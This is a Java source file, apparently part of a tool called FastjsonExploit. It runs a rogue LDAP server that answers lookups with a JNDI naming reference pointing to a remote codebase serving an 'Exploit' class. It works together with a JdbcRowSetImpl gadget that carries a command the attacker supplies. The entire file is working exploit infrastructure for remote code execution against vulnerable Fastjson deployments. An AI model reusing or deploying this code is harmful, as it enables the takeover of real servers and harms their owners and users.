public class LDAPServer {
	private static final java.lang.String LDAP_BASE = "dc=example,dc=com";

	public static void lanuchLDAPServer(java.lang.Integer ldap_port, java.lang.String http_server, java.lang.Integer http_port) throws java.lang.Exception {
		try {
			com.unboundid.ldap.listener.InMemoryDirectoryServerConfig config = new com.unboundid.ldap.listener.InMemoryDirectoryServerConfig(server.LDAPServer.LDAP_BASE);
			config.setListenerConfigs(new com.unboundid.ldap.listener.InMemoryListenerConfig("listen", java.net.InetAddress.getByName("0.0.0.0"), ldap_port, javax.net.ServerSocketFactory.getDefault(), javax.net.SocketFactory.getDefault(), ((javax.net.ssl.SSLSocketFactory) (javax.net.ssl.SSLSocketFactory.getDefault()))));
			config.addInMemoryOperationInterceptor(new server.LDAPServer.OperationInterceptor(new java.net.URL(((("http://" + http_server) + ":") + http_port) + "/#Exploit")));
			com.unboundid.ldap.listener.InMemoryDirectoryServer ds = new com.unboundid.ldap.listener.InMemoryDirectoryServer(config);
			java.lang.System.out.println(java.lang.String.format("[*] LDAP server listening on 0.0.0.0:%d (ldap://%s:%d/Exploit)", ldap_port, http_server, ldap_port));
			ds.startListening();
		} catch (java.lang.Exception e) {
			java.lang.System.out.println("[!] Start LDAP Server fail!");
			e.printStackTrace();
		}
	}

	private static class OperationInterceptor extends com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor {
		private java.net.URL codebase;

		public OperationInterceptor(java.net.URL cb) {
			this.codebase = cb;
		}

		@java.lang.Override
		public void processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult result) {
			java.lang.String base = result.getRequest().getBaseDN();
			com.unboundid.ldap.sdk.Entry e = new com.unboundid.ldap.sdk.Entry(base);
			try {
				sendResult(result, base, e);
			} catch (java.lang.Exception e1) {
				e1.printStackTrace();
			}
		}

		protected void sendResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult result, java.lang.String base, com.unboundid.ldap.sdk.Entry e) throws com.unboundid.ldap.sdk.LDAPException, java.net.MalformedURLException {
			java.net.URL turl = new java.net.URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
			java.lang.System.out.println((("[+] [LDAP server log] Send LDAP reference result for " + base) + " redirecting to ") + turl);
			e.addAttribute("javaClassName", "foo");
			java.lang.String cbstring = this.codebase.toString();
			int refPos = cbstring.indexOf('#');
			if (refPos > 0) {
				cbstring = cbstring.substring(0, refPos);
			}
			e.addAttribute("javaCodeBase", cbstring);
			e.addAttribute("objectClass", "javaNamingReference");
			e.addAttribute("javaFactory", this.codebase.getRef());
			result.sendSearchEntry(e);
			result.setResult(new com.unboundid.ldap.sdk.LDAPResult(0, com.unboundid.ldap.sdk.ResultCode.SUCCESS));
		}
	}

	public static void main(java.lang.String[] args) throws java.lang.Exception {
		if (args.length != 3) {
			java.lang.System.out.println("Usage: java -cp FastjsonExploit-<version>.jar server.LDAPServer ldap_host ldap_port [cmd/code]");
			java.lang.System.exit(0);
		}
		util.Common.byteCode = gadget.Gadget.getJdbcRowSetImplExpCode(args[2]);
		java.lang.String server_host = args[0];
		int ldap_port = java.lang.Integer.valueOf(args[1]);
		int http_server_port = util.Util.getUnusePort(server_host);
		server.CodebaseServer.lanuchCodebaseURLServer(server_host, http_server_port);
		server.LDAPServer.lanuchLDAPServer(ldap_port, server_host, http_server_port);
	}
}